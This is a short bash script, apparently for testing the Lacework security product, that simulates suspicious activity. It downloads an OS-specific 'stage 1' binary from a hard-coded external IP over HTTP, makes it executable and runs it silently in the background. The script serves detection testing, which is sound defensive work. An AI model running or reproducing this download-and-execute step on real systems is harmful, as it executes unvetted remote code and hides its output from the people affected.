#!/bin/bash
# Script to simulate activity that will trigger Lacework events

EXT_IP="54.184.116.123"
FILENAME="lw-stage-1-"
BIN_URL="http://${EXT_IP}/bin/"

get_os_type () {
	case "$OSTYPE" in
		darwin*)	OS_TYPE=darwin ;;
		linux*)		OS_TYPE=linux ;;
	esac
}

download_exec_binary() {

	# Download the first stage binary
	echo "Downloading ${FILENAME}$1..."
        if [[ $(curl -s -w "%{http_code}\\n" -X GET ${BIN_URL}${FILENAME}$1 -o ${FILENAME}$1) -eq 200 ]]
        then
                echo " - Successfully downloaded ${FILENAME}$1!"
        else
                echo " - Failed to download ${FILENAME}$1!"
        fi

	# Change permissions so it can be executed
	echo "Changing permissins on ${FILENAME}$1 to allow execution..."
	chmod u+x ${FILENAME}$1
	if [[ $? -eq 0 ]]
	then
		echo " - Successfully changed permissions"
	else
		echo " - Failed to change permissions on ${FILENAME}$1!"
	fi

	# Execute the binary
	echo "Executing ${FILENAME}$1..."
	./${FILENAME}$1 >/dev/null 2>&1 &
	if [[ $? -eq 0 ]]
        then
                echo " - Successfully executed ${FILENAME}$1!"
        else
                echo " - Failed to execute ${FILENAME}$1!"
        fi
}

# get os type
get_os_type

# download the right binary
download_exec_binary $OS_TYPE

echo "Script completed, terminating."
